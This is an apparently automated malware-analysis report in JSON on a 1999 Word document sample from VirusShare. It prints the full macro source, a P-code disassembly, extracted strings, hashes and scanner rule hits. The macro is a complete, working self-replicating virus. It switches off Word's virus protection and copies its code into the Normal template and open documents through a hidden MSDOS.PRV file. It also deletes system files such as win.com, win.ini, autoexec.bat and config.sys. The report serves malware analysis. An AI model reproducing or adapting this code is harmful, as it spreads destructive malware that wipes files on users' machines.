{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CodeModule": "May attempt to modify the VBA code",
            "Document_Close": "Runs when the Word document is closed",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Kill": "May delete a file",
            "Open": "May open a file",
            "Output": "May write to a file",
            "Print #": "May write to a file",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "autoexec": "Runs when the Word document is opened",
            "windows": "May enumerate application windows"
        },
        "macro": "Private Sub Document_Close()\nOn Error Resume Next\nADS = ActiveDocument.Saved\nApplication.EnableCancelKey = Not -1\nWith Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With\nIf Dir(\"MSDOS.PRV\", 6) = \"\" Then\nOpen \"MSDOS.PRV\" For Output As #1\nFor iLoop = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines\nCodeLine = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(iLoop, 1)\nPrint #1, CodeLine\nNext iLoop\nClose #1\nSetAttr \"MSDOS.PRV\", 6\nEnd If\nIf Dir(\"\\windows\\win.com\") <> \"\" Then Kill \"\\windows\\win.com\"\nIf Dir(\"\\windows\\win.ini\") <> \"\" Then Kill \"\\windows\\win.ini\"\nIf Dir(\"\\autoexec.bat\") <> \"\" Then Kill \"\\autoexec.bat\"\nIf Dir(\"\\config.sys\") <> \"\" Then Kill \"\\config.sys\"\nIf Dir(\"\\windows\\class.sys\") <> \"\" Then Kill \"\\windows\\class.sys\"\nIf Dir(\"\\class.sys\") <> \"\" Then Kill \"\\class.sys\"\nIf NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> \"Private Sub Document_Close()\" Then\nSet TheItem = NormalTemplate.VBProject.VBComponents.Item(1)\nElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> \"Private Sub Document_Close()\" Then\nSet TheItem = ActiveDocument.VBProject.VBComponents.Item(1)\nElse\nTheItem = \"\"\nEnd If\nIf TheItem <> \"\" Then\nOpen \"MSDOS.PRV\" For Input As #1\nIf LOF(1) = 0 Then GoTo Fin\nCount = 1\nDo While Not EOF(1)\nLine Input #1, CodeLine\nTheItem.CodeModule.InsertLines Count, CodeLine\nCount = Count + 1\nLoop\nFin:\nClose #1\nWith Dialogs(wdDialogFileSummaryInfo): .Title = \"OOPS\": .Author = \"Billy McGrop\": .Keywords = \"To Vile\": .Execute: End With\nIf Left(ActiveDocument.Name, 8) <> \"Document\" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName\nEnd If\nIf ActiveDocument.Saved <> ADS Then ActiveDocument.Saved = ADS\nEnd Sub\n\n' Processing file: VirusShare_49e21f89807fa47416781ac0eef53f20\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 3698 bytes\n' Line #0:\n' \tFuncDefn (Private Sub Document_Close())\n' Line #1:\n' \tOnError (Resume Next) \n' Line #2:\n' \tLd ActiveDocument \n' \tMemLd Saved \n' \tSt ADS \n' Line #3:\n' \tLitDI2 0x0001 \n' \tUMi \n' \tNot \n' \tLd Application \n' \tMemSt EnableCancelKey \n' Line #4:\n' \tStartWithExpr \n' \tLd Options \n' \tWith \n' \tBoS 0x0000 \n' \tLitDI2 0x0000 \n' \tMemStWith ConfirmConversions \n' \tBoS 0x0000 \n' \tLitDI2 0x0000 \n' \tMemStWith VirusProtection \n' \tBoS 0x0000 \n' \tLitDI2 0x0000 \n' \tMemStWith SaveNormalPrompt \n' \tBoS 0x0000 \n' \tEndWith \n' Line #5:\n' \tLitStr 0x0009 \"MSDOS.PRV\"\n' \tLitDI2 0x0006 \n' \tArgsLd Dir 0x0002 \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tIfBlock \n' Line #6:\n' \tLitStr 0x0009 \"MSDOS.PRV\"\n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Output)\n' Line #7:\n' \tStartForVariable \n' \tLd iLoop \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd MacroContainer \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tFor \n' Line #8:\n' \tLd iLoop \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd MacroContainer \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tSt CodeLine \n' Line #9:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLd CodeLine \n' \tPrintItemNL \n' Line #10:\n' \tStartForVariable \n' \tLd iLoop \n' \tEndForVariable \n' \tNextVar \n' Line #11:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #12:\n' \tLitStr 0x0009 \"MSDOS.PRV\"\n' \tLitDI2 0x0006 \n' \tArgsCall SetAttr 0x0002 \n' Line #13:\n' \tEndIfBlock \n' Line #14:\n' \tLitStr 0x0010 \"\\windows\\win.com\"\n' \tArgsLd Dir 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x0010 \"\\windows\\win.com\"\n' \tArgsCall Kill 0x0001 \n' \tEndIf \n' Line #15:\n' \tLitStr 0x0010 \"\\windows\\win.ini\"\n' \tArgsLd Dir 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x0010 \"\\windows\\win.ini\"\n' \tArgsCall Kill 0x0001 \n' \tEndIf \n' Line #16:\n' \tLitStr 0x000D \"\\autoexec.bat\"\n' \tArgsLd Dir 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x000D \"\\autoexec.bat\"\n' \tArgsCall Kill 0x0001 \n' \tEndIf \n' Line #17:\n' \tLitStr 0x000B \"\\config.sys\"\n' \tArgsLd Dir 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x000B \"\\config.sys\"\n' \tArgsCall Kill 0x0001 \n' \tEndIf \n' Line #18:\n' \tLitStr 0x0012 \"\\windows\\class.sys\"\n' \tArgsLd Dir 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x0012 \"\\windows\\class.sys\"\n' \tArgsCall Kill 0x0001 \n' \tEndIf \n' Line #19:\n' \tLitStr 0x000A \"\\class.sys\"\n' \tArgsLd Dir 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x000A \"\\class.sys\"\n' \tArgsCall Kill 0x0001 \n' \tEndIf \n' Line #20:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitStr 0x001C \"Private Sub Document_Close()\"\n' \tNe \n' \tIfBlock \n' Line #21:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tSet TheItem \n' Line #22:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitStr 0x001C \"Private Sub Document_Close()\"\n' \tNe \n' \tElseIfBlock \n' Line #23:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tSet TheItem \n' Line #24:\n' \tElseBlock \n' Line #25:\n' \tLitStr 0x0000 \"\"\n' \tSt TheItem \n' Line #26:\n' \tEndIfBlock \n' Line #27:\n' \tLd TheItem \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIfBlock \n' Line #28:\n' \tLitStr 0x0009 \"MSDOS.PRV\"\n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Input)\n' Line #29:\n' \tLitDI2 0x0001 \n' \tArgsLd LOF 0x0001 \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tGoTo Fin \n' \tEndIf \n' Line #30:\n' \tLitDI2 0x0001 \n' \tSt Count \n' Line #31:\n' \tLitDI2 0x0001 \n' \tArgsLd EOF 0x0001 \n' \tNot \n' \tDoWhile \n' Line #32:\n' \tLitDI2 0x0001 \n' \tLd CodeLine \n' \tLineInput \n' Line #33:\n' \tLd Count \n' \tLd CodeLine \n' \tLd TheItem \n' \tMemLd CodeModule \n' \tArgsMemCall InsertLines 0x0002 \n' Line #34:\n' \tLd Count \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt Count \n' Line #35:\n' \tLoop \n' Line #36:\n' \tLabel Fin \n' Line #37:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #38:\n' \tStartWithExpr \n' \tLd wdDialogFileSummaryInfo \n' \tArgsLd Dialogs 0x0001 \n' \tWith \n' \tBoS 0x0000 \n' \tLitStr 0x0004 \"OOPS\"\n' \tMemStWith Title \n' \tBoS 0x0000 \n' \tLitStr 0x000C \"Billy McGrop\"\n' \tMemStWith Author \n' \tBoS 0x0000 \n' \tLitStr 0x0007 \"To Vile\"\n' \tMemStWith Keywords \n' \tBoS 0x0000 \n' \tArgsMemCallWith Execute 0x0000 \n' \tBoS 0x0000 \n' \tEndWith \n' Line #39:\n' \tLd ActiveDocument \n' \tMemLd New \n' \tLitDI2 0x0008 \n' \tArgsLd LBound 0x0002 \n' \tLitStr 0x0008 \"Document\"\n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed FileName \n' \tLd ActiveDocument \n' \tArgsMemCall SaveAs 0x0001 \n' \tEndIf \n' Line #40:\n' \tEndIfBlock \n' Line #41:\n' \tLd ActiveDocument \n' \tMemLd Saved \n' \tLd ADS \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd ADS \n' \tLd ActiveDocument \n' \tMemSt Saved \n' \tEndIf \n' Line #42:\n' \tEndSub \n"
    },
    "filename": "VirusShare_49e21f89807fa47416781ac0eef53f20",
    "filesize": 35328,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Title: OOPS, Author: Billy McGrop, Keywords: To Vile, Template: Cbtnorm.dot, Last Saved By: Ditry PC, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Mon Nov  1 22:14:00 1999, Last Saved Time/Date: Mon Nov  1 22:14:00 1999, Number of Pages: 1, Number of Words: 217, Number of Characters: 1238, Security: 0",
    "hashes": {
        "md5": "49e21f89807fa47416781ac0eef53f20",
        "sha1": "6172e50f5d476d2025006161efbed4c30bf8bffe",
        "sha256": "e683e5165c9fca8de1b0985ecf929c52c4620c46e98fbc1ce75bfe17824ce375"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj\u064e",
            "epform10",
            "Wide World Importers Presents",
            "A Summer Concert",
            "Michael Rauh, Conductor",
            "May 7, 1994",
            "epform20",
            "Make plans now to attend our next concert, \"A Tribute to Mozart,\" on June 11. Director Michael Rauh steps down from the podium to perform as our featured harpsichord soloist.",
            "epform40",
            "Symphony No. 9\tDmitri Shostakovich",
            "Eight Folk Songs\tAnatol LiADOV",
            "Romeo & Juliet\tPeter Ilich TSchaikovsky",
            "epbord10",
            "Wide World Importers",
            "Interoffice Memo",
            "To:\tAll Subsidiary Managers",
            "From:\tAnne Gabor, General Manager",
            "Re:\tYearly Sales",
            "Date:\tJuly 15, 1994",
            "epbord20",
            "A Timeline for Clocks",
            "EMBED MSDraw   \\* mergeformat",
            "14th century",
            "15th century",
            "16th century",
            "17th century",
            "19th century",
            "20th century",
            "epbull10 and epbull20",
            "Precious stones",
            "Diamond",
            "Ruby and sapphire (forms of corundum)",
            "Emerald",
            "Semiprecious stones",
            "Amethyst",
            "Aquamarine",
            "Garnet",
            "Jade",
            "Moonstone",
            "Opal",
            "epstyl10",
            "Tour Details:  You arrive in Sydney at 7 P.M., in plenty of time to settle in and rest.",
            "An adventure is a dare you take personally. It's an opportunity that also involves some risk.  It is inspired by an age-old sort of challenge, and the tools it involves -- boats, planes, or snow.",
            "epfoot20",
            "Our store features diamonds, rubies, sapphires, and emeralds.",
            "  We also feature a large selection of amethyst, aquamarine, garnet, jade",
            ", moonstone, opal, quartz, topaz, tourmaline, and turquoise.",
            "Diamonds, rubies, sapphires, emeralds, and jade remain our biggest sellers.  We also have a substantial market for amethyst, aquamarine, and turquoise.",
            "epend",
            "We sell both cut and uncut preciousand semiprecious  gems.",
            "We have the region's largest selection of jade.",
            "/ =!",
            "MSDraw",
            "MrEd",
            "Microsoft Draw",
            "MrEd",
            "System",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "erences",
            "METAFILEPICT",
            "MrEd",
            "Microsoft Draw",
            "MrEd",
            "System",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "erences",
            "D&9aJ",
            "K K/?kQ",
            "D&9aJ",
            "K K/?kQp",
            "xS=K@",
            ",,,E",
            "ovvF",
            "6\u01f0S^?&pz\u05cfjV9O.Uwau'd}",
            "W:hh[Z}H",
            "THo5f",
            "?Sm8\"_Q",
            "\u0416O-G(\u01e0BR",
            "\u035bF\u031biO",
            "m4Ye'XDaVr1A!?",
            "H@\u02eb#",
            "E0U`[o3d",
            "c>yy<[A\u02f0\u06c10F\u06ce5crs~kn1",
            "iVVF",
            "OOPS",
            "Billy McGrop",
            "To Vile",
            "Cbtnorm.dot",
            "Ditry PC",
            "Microsoft Word 8.0",
            "VIRUS ROOM",
            "OOPS",
            "Title",
            "_PID_GUID",
            "`Hz$",
            "MSDOS.PRV",
            "MSDOS.PRV",
            "MSDOS.PRV",
            "\\windows\\win.com$",
            "\\windows\\win.comA@D",
            "\\windows\\win.ini$",
            "\\windows\\win.iniA@D",
            "\\autoexec.bat",
            "\\autoexec.bat",
            "\\config.sys",
            "\\config.sys",
            "\\windows\\class.sys$",
            "\\windows\\class.sysA@D",
            "\\class.sys$",
            "\\class.sysA@D",
            "Private Sub Document_Close()",
            "Private Sub Document_Close()",
            "MSDOS.PRV",
            "OOPS9",
            "Billy McGrop9",
            "To Vile",
            "Document",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "8 Sub ",
            "t_Cl",
            "On Erro r Res",
            " NHext",
            "]DSQAct5",
            "pplicat@ion.En",
            "ancelKey",
            "Not -1",
            "With Op",
            "s: .Con",
            "firm",
            "ver*s",
            "rusProtey",
            "End +",
            "If Dir",
            "(\"MSDOS.",
            "PRV\", 6)",
            "\"\" Then!kpen ",
            "qOutput 0As #(A",
            "1 To@ Macro(t",
            "ainer.VB",
            "Comp",
            "ons.Ite",
            "m(1)4deM odule",
            "tOfL",
            "Code",
            "b(B', 1i@qnt-, ",
            "t5Set'A\t?",
            "AOIf",
            "N\\window",
            ".com\")",
            " <> ",
            "P Ki0ll \"",
            "auto",
            "exec.bat",
            "cg.s|ys",
            ": pssv",
            "Wv_IFI",
            "?1>1we] >^",
            "S`N_",
            "ntXB`il}",
            "3gYInh  LO",
            "(0B Go@Fi`Co{",
            "`Do WhiE\"",
            "A  \t",
            "IInsert& y",
            ":i|Dialogs(wd#",
            "SummaryI",
            "nfo)Tit\"\"OOPS\"",
            "Auth",
            "y McGropC!",
            "word\"m",
            "E@t@:",
            " A,Left(6!, 8DE?c)L",
            "Full",
            "dAdA`",
            "3381e10c9",
            "\u0650\t6\u04f5&",
            "Wordk",
            "Win16~",
            "Win32",
            "sample16",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Documentj",
            "Document_Close7\\",
            "ActiveDocument\\",
            "Savedd",
            "Application*",
            "EnableCancelKey",
            "Options",
            "ConfirmConversions",
            "VirusProtectionoD",
            "SaveNormalPrompt\u02bc",
            "iLoopp",
            "MacroContainer>",
            "VBProjectOh",
            "VBComponents",
            "Itemz",
            "CodeModule",
            "CountOfLines!\\",
            "CodeLineW",
            "Lines",
            "SetAttrC",
            "Kill",
            "NormalTemplateq",
            "TheItem",
            "LOFc",
            "Finw",
            "Count0v",
            "InsertLines",
            "Dialogs",
            "wdDialogFileSummaryInfo",
            "Title~",
            "Author",
            "Keywords",
            "ExecuteY",
            "SaveAsf;",
            "FileNamej",
            "FullName\u041e",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "STDOLE2.",
            "TLB#",
            "tomation",
            "mMSFo@rms>",
            "FF8B9AD",
            "A0-90A8-",
            "11D3-ACD",
            "0936D3",
            "3.TW",
            "D#MicrosPoft ",
            " Libr8ary",
            "P853397A3",
            "P9'PJP\\VBE\\(",
            "EX(.E",
            "CxN@Ua*lCxNTax",
            "j +\t,C",
            "Offi",
            "cDO@f",
            "DF8D04C-",
            "5BFA-101@B-BDE5@A*A@4",
            "2HPR",
            "OGRAM FI",
            "LES\\MICR",
            "OSOFT OF FICE\\",
            "MSO97.DLLHk# 8.0k",
            "ThisDocu ment",
            "h@6s",
            "\"DIc",
            "ThisDocument",
            "ID=\"{B78E37A7-90A9-11D3-ACD9-900936D3B526}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"E5E7375CF945FD45FD45FD45FD\"",
            "DPB=\"CAC8187FFC80FC80FC\"",
            "GC=\"AFAD7D9A879A6DP",
            "9B6D9B92\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.313698",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
